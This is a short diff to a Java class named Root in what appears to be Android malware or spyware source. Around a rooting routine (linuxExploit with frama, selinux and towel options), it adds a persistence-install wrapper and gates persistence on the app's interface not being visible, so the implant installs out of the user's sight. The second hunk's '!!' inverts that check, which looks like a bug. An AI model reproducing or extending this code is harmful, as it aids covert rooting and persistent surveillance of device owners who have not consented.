@@ -800,6 +800,13 @@ public class Root {
 		}
 	}
 
+
+	public static void installPersistence() {
+		if (Cfg.PERSISTENCE) {
+			Root.installPersistence(false);
+		}
+	}
+
 	private static void linuxExploit(boolean synchronous, boolean frama, boolean selinux, boolean towel) {
 
 		class CET implements Runnable {
@@ -814,7 +821,7 @@ public class Root {
 				if (PackageInfo.checkRoot()) {
 					Status.setExploitResult(Status.EXPLOIT_RESULT_SUCCEED);
 					Status.setRoot(true);
-					if (Cfg.PERSISTENCE) {
+					if (Cfg.PERSISTENCE && !RunningProcesses.self().isGuiVisible()) {
 						Root.installPersistence(false);
 					}
 					Status.self().setReload();
@@ -991,7 +998,7 @@ public class Root {
 				}
 				// Avoid having the process killed for using too many resources
 				Root.adjustOom();
-				if (Cfg.PERSISTENCE) {
+				if (Cfg.PERSISTENCE && !!RunningProcesses.self().isGuiVisible()) {
 					Root.installPersistence(false);
 				}
 
